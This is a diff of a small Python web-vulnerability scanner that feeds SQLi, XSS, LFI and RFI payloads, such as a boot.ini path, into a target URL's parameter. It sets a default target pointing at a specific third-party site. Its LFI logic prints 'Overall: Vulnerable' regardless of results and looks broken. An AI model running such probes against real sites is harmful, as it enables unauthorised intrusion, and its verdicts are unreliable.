@@ -41,7 +41,7 @@ lfi = ["C:\\boot.ini",
 rfi = ["http://www.snailbook.com/docs/publickey-file.txt"]
 rce = []
 
-def clearScreen():
+def clearScreen():                                                          # Clears the screen and re-prints the logo
     if sys.platform == 'win32':os.system('cls')
     else:os.system('clear')
     print('''
@@ -52,10 +52,11 @@ def clearScreen():
     /_/ /_/\____/\___/\__/\__,_/_/\___/	               `-'
     ''')
 
-def get():
+def get():                                                                  # Function for the -m get parameter
     x = input("\n\t1. SQLi\n\t2. XSS\n\t3. LFI\n\t4. RFI\n\t5. RCE\n")
     if x=="1":
         for i in sqli:
+            print("Testing: " + i)
             req = args.url + i
             try:
                 with urllib.request.urlopen(req) as response:
@@ -64,8 +65,8 @@ def get():
                     for line in f.readlines():
                         line = line.rstrip('\n')
                         if line in html:
-                            print("\nLikely vulnerable.")
-                            return
+                            print("Likely vulnerable.\n")
+                            break
             except Exception as e:
                 print(e)
 
@@ -83,6 +84,7 @@ def get():
 
     elif x=="3":
         n = args.url.find('=') + 1
+        overall = False
         for i in lfi:
             req = args.url[:n] + i
             try:
@@ -97,7 +99,10 @@ def get():
                             print("Not found.\n")
                             break
                         vuln = True
-                if vuln:print("Likely vulnerable.\n")
+                if vuln:
+                    print("File detected.\n")
+                    overall = True
+        print("\n\nOverall: Vulnerable")
             except Exception as e:
                 print(str(e) + "\n")
     elif x=="4":
@@ -115,22 +120,25 @@ def get():
                 print(str(e) + "\n")
     elif x=="5":atk = rce
 
-def post():
+def post():                                                                 # Function for the -m post parameter (unfinished)
     print("POST functionality not yet developed.")
 
-def cookie():
+def cookie():                                                               # Function for the -m cookie parameter (unfinished)
     print("COOKIE functionality not yet developed.")
 
-parser = argparse.ArgumentParser()
+parser = argparse.ArgumentParser()                                          # Begin agument setup
 
 parser.add_argument('-m', '--method', dest='method', help='get, post, or cookie', default='get')
-parser.add_argument('-u', '--url', dest='url', help='url to target')
+parser.add_argument('-u', '--url', dest='url', help='url to target', default='http://www.kapaver.com/product-details.php?product_id=1')
 parser.add_argument('-p', '--parameter', dest='parameter', help='parameter to use')
 parser.add_argument('-d', '--data', dest='data', help='data to use for post or cookie module', default=None)
 
-args = parser.parse_args()
+args = parser.parse_args()                                                  # End argument setup
 
 clearScreen()
+                                                                            # Begin the "main" function
+if sys.platform == 'win32':os.system('color a')
+else:os.system('csetterm -foreground green -store')
 
 if args.method.lower() == 'get':get()
 elif args.method.lower() == 'post':post()
